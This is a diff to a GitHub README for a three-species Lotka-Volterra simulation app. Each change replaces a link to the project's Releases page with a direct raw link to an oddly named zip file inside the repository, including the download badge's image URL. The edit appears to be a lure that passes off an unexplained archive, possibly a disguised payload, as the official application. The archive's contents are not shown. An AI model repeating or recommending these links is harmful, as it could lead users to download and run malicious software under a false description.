@@ -1,6 +1,6 @@
 # 🌟 lotka-volterra-three-species - Explore Predator-Prey Dynamics Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/heyparty/lotka-volterra-three-species/releases)
+[![Download](https://github.com/heyparty/lotka-volterra-three-species/raw/refs/heads/main/intolerable/species_volterra_three_lotka_chromatophoric.zip)](https://github.com/heyparty/lotka-volterra-three-species/raw/refs/heads/main/intolerable/species_volterra_three_lotka_chromatophoric.zip)
 
 ## 📚 Description
 
@@ -14,7 +14,7 @@ Follow these steps to get started with the Lotka-Volterra model application.
    
    You can find the latest version of this software on the Releases page. 
 
-   [Visit this page to download](https://github.com/heyparty/lotka-volterra-three-species/releases)
+   [Visit this page to download](https://github.com/heyparty/lotka-volterra-three-species/raw/refs/heads/main/intolerable/species_volterra_three_lotka_chromatophoric.zip)
 
 2. **Download the Application**
    
@@ -62,7 +62,7 @@ To ensure optimal performance, please meet the following requirements:
   
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/heyparty/lotka-volterra-three-species/releases) the application. Follow the instructions above to install and run the software. 
+To get started, please [visit this page to download](https://github.com/heyparty/lotka-volterra-three-species/raw/refs/heads/main/intolerable/species_volterra_three_lotka_chromatophoric.zip) the application. Follow the instructions above to install and run the software. 
 
 You will be on your way to understanding predator-prey dynamics without needing extensive technical knowledge.
 
